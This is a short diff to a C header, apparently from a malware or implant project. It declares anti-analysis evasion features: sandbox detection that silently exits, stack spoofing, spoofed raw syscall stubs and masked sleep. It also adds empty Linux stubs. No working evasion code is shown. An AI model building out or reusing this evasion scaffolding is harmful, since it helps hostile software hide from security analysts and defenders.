@@ -1,4 +1,5 @@
 #pragma once
+#ifdef _WIN32
 #include <windows.h>
 
 /* Score-based sandbox/analysis detection — exits process silently if detected */
@@ -52,3 +53,10 @@ void init_stack_spoof(void);
 /* Build a spoofed stub for any raw syscall number on demand.
  * Returns a callable function pointer, or NULL if unavailable. */
 void *spoof_syscall_stub(unsigned short ssn);
+
+#else /* !_WIN32 — Linux stubs */
+#include <unistd.h>
+static inline void sandbox_check(void) {}
+static inline void evasion_init(void)  {}
+static inline void sleep_masked(unsigned long ms) { usleep((unsigned int)(ms * 1000UL)); }
+#endif /* _WIN32 */
